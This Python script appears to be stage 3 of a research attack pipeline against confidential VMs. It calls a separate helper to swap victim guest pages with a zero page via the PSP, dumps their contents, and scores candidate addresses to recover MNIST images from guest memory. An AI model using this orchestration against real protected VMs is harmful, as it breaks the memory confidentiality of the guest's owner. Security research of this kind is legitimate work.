#!/usr/bin/env python3
"""
stage3_swap_dump.py — Stage 3: PSP Page Swap and Memory Dump.

Swaps victim Page 1 and Page 2 with the clean Zero Page via swap_and_dump.py
(with --swap-back for guest memory safety) and records dump paths in swap_meta_{index}.json.

Usage:
    python3 stage3_swap_dump.py --index 0 [--output-dir .]
"""

import argparse
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c


def swap_and_dump_page(image_gpa: int, zero_gpa: int, label: int, index: int,
                       output_file: Path, output_dir: Path):
    """Execute swap_and_dump.py for a single 4KB page."""
    swap_script = c.FLOW_DIR / "swap_and_dump.py"
    if not swap_script.exists():
        swap_script = c.HOST_SCRIPTS_DIR / "swap_and_dump.py"

    cmd = [
        sys.executable, str(swap_script),
        "--image-gpa", f"0x{image_gpa:x}",
        "--zero-gpa",  f"0x{zero_gpa:x}",
        "--label",     str(label),
        "--index",     str(index),
        "--output-dir", str(output_dir),
        "--output",    str(output_file),
    ]
    t0 = time.time()
    subprocess.run(cmd, check=True)
    print(f"[stage3] Swapped & dumped GPA 0x{image_gpa:x} → {output_file.name} ({time.time() - t0:.2f}s)")


def validate_candidate_gpa(cand_gpa: int, zero_gpa: int, z_file: Path, dumps_dir: Path, index: int) -> Tuple[bool, int]:
    """Test a candidate page dump against zero page. Return (is_valid, active_chunks)."""
    test_out = dumps_dir / f"test_cand_0x{cand_gpa:x}.out"
    try:
        swap_and_dump_page(cand_gpa, zero_gpa, 0, index, test_out, dumps_dir)
        z_buf = c.parse_dump(z_file)
        p_buf = c.parse_dump(test_out)
        active_chunks = sum(1 for k in range(c.CHUNKS_PER_PAGE) if any(z_buf[i] ^ p_buf[i] for i in range(k*c.CHUNK_BYTES, (k+1)*c.CHUNK_BYTES)))
        test_out.unlink(missing_ok=True)
        # Real MNIST pages have 15..180 active chunks. 256/256 is non-image garbage, 0 is unmapped/empty
        is_valid = (10 <= active_chunks <= 180)
        return is_valid, active_chunks
    except Exception:
        test_out.unlink(missing_ok=True)
        return False, 0


def run_stage3(index: int, output_dir: Path, image_gpa: Optional[int] = None,
               page2_gpa: Optional[int] = None, zero_gpa: Optional[int] = None,
               label: Optional[int] = None, batch_size: int = 1) -> Dict:
    """Execute Stage 3."""
    dumps_dir, logs_dir, results_dir = c.get_output_subdirs(output_dir)
    meta_path = results_dir / f"swap_meta_{index}.json"

    # 1. Resolve Zero GPA
    z_file = dumps_dir / "z.out"
    if not z_file.exists():
        z_file = output_dir / "z.out"
    if zero_gpa is None:
        for z_cand in [results_dir / "zero_gpa.json", output_dir / "zero_gpa.json", HERE / "zero_gpa.json"]:
            if z_cand.exists():
                zero_data = c.load_json(z_cand)
                zero_gpa = int(zero_data["zero_gpa"], 16)
                break
        if zero_gpa is None:
            raise FileNotFoundError(f"[stage3] zero_gpa.json not found. Run stage1_zero_gpa.py first.")

    # 2. Resolve Target GPA and Label from Stage 2
    page_gpas = []
    target_json = results_dir / f"tracked_target_{index}.json"
    if not target_json.exists():
        target_json = output_dir / f"tracked_target_{index}.json"
    if not target_json.exists():
        target_json = HERE / f"tracked_target_{index}.json"
    if target_json.exists():
        target_data = c.load_json(target_json)
        if image_gpa is None and target_data.get("image_gpa"):
            image_gpa = int(target_data["image_gpa"], 16)
        if label is None:
            label = int(target_data.get("label", 0))
        if page2_gpa is None and target_data.get("page2_gpa"):
            page2_gpa = int(target_data["page2_gpa"], 16)
        if target_data.get("page_gpas_int"):
            page_gpas = target_data["page_gpas_int"]
        if target_data.get("batch_size"):
            batch_size = target_data["batch_size"]

        # Blind Top-N Auto-Validation
        candidates = target_data.get("candidates", [])
        if candidates and target_data.get("blind_detected") and z_file.exists() and len(candidates) >= 1:
            print(f"\n[stage3] [blind-verify] Validating {len(candidates)} Top-N candidate(s) via active chunk analysis...")
            for rank, cand in enumerate(candidates, 1):
                test_g = cand["exact"]
                is_val, active_cnt = validate_candidate_gpa(test_g, zero_gpa, z_file, dumps_dir, index)
                if is_val:
                    print(f"[stage3] [blind-verify] ACCEPTED Candidate #{rank} (0x{test_g:x})! (Active: {active_cnt}/256 chunks, Valid MNIST Range)")
                    image_gpa = test_g
                    num_pages = (batch_size * c.IMG_BYTES + c.PAGE_SIZE - 1) // c.PAGE_SIZE
                    if batch_size == 1:
                        page_gpas = [image_gpa, page2_gpa if page2_gpa else image_gpa + c.PAGE_SIZE]
                    else:
                        page_gpas = [image_gpa + k * c.PAGE_SIZE for k in range(num_pages)]
                    break
                else:
                    print(f"[stage3] [blind-verify] REJECTED Candidate #{rank} (0x{test_g:x}): {active_cnt}/256 active chunks (Noise/Non-image)")

    if image_gpa is None:
        raise ValueError(f"[stage3] Target image GPA not specified or found in tracked_target_{index}.json")

    label_val = label if label is not None else 0

    # Build page list
    num_pages = (batch_size * c.IMG_BYTES + c.PAGE_SIZE - 1) // c.PAGE_SIZE
    if not page_gpas:
        if batch_size == 1:
            if page2_gpa is None:
                page2_table = c.load_page2_table()
                page2_gpa = page2_table.get(image_gpa, image_gpa + c.PAGE_SIZE)
            page_gpas = [image_gpa, page2_gpa]
        else:
            page_gpas = [image_gpa + k * c.PAGE_SIZE for k in range(num_pages)]

    print(f"[stage3] Starting swap dump for index #{index} (bs={batch_size}, {len(page_gpas)} pages)")
    print(f"         Zero GPA  : 0x{zero_gpa:x}")
    print(f"         Start GPA : 0x{image_gpa:x}")

    t0 = time.time()
    pacer = c.Pacer()
    dump_files = []

    if batch_size == 1 and len(page_gpas) == 2:
        dump_p1 = dumps_dir / f"{label_val}-{index}.out"
        dump_p2 = dumps_dir / f"{label_val}-{index}_p2.out"
        pacer.tick()
        swap_and_dump_page(page_gpas[0], zero_gpa, label_val, index, dump_p1, dumps_dir)
        pacer.tick()
        swap_and_dump_page(page_gpas[1], zero_gpa, label_val, index, dump_p2, dumps_dir)
        dump_files = [str(dump_p1), str(dump_p2)]
    else:
        for k, gpa in enumerate(page_gpas):
            dump_k = dumps_dir / f"batch_{index}_p{k:03d}.out"
            pacer.tick()
            swap_and_dump_page(gpa, zero_gpa, label_val, index, dump_k, dumps_dir)
            dump_files.append(str(dump_k))
            if (k + 1) % 50 == 0 or (k + 1) == len(page_gpas):
                print(f"[stage3] Progress: {k + 1}/{len(page_gpas)} pages swapped and dumped")

    meta = {
        "stage": 3,
        "index": index,
        "batch_size": batch_size,
        "label": label_val,
        "zero_gpa": f"0x{zero_gpa:x}",
        "image_gpa": f"0x{image_gpa:x}",
        "page_gpas": [f"0x{g:x}" for g in page_gpas],
        "dump_files": dump_files,
        "dump_p1": dump_files[0] if len(dump_files) > 0 else None,
        "dump_p2": dump_files[1] if len(dump_files) > 1 else None,
        "total_swap_time_sec": time.time() - t0,
        "timestamp": time.time(),
    }
    c.save_json(meta_path, meta)
    print(f"[stage3] Saved swap metadata → {meta_path.name} (Total time: {time.time() - t0:.2f}s)")
    return meta


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, required=True, help="MNIST sample index (0-59999)")
    p.add_argument("--batch-size", type=int, default=1, help="Batch size (default: 1, e.g. 512)")
    p.add_argument("--label", type=int, default=None, help="MNIST digit label (0-9)")
    p.add_argument("--image-gpa", default=None, help="Page 1 GPA override (hex)")
    p.add_argument("--page2-gpa", default=None, help="Page 2 GPA override (hex)")
    p.add_argument("--zero-gpa", default=None, help="Zero GPA override (hex)")
    p.add_argument("--output-dir", default=str(HERE), help="Directory containing/saving outputs")
    args = p.parse_args()

    img_gpa = int(args.image_gpa, 16) if args.image_gpa else None
    p2_gpa  = int(args.page2_gpa, 16) if args.page2_gpa else None
    z_gpa   = int(args.zero_gpa, 16) if args.zero_gpa else None

    run_stage3(args.index, Path(args.output_dir), image_gpa=img_gpa,
               page2_gpa=p2_gpa, zero_gpa=z_gpa, label=args.label, batch_size=args.batch_size)


if __name__ == "__main__":
    main()
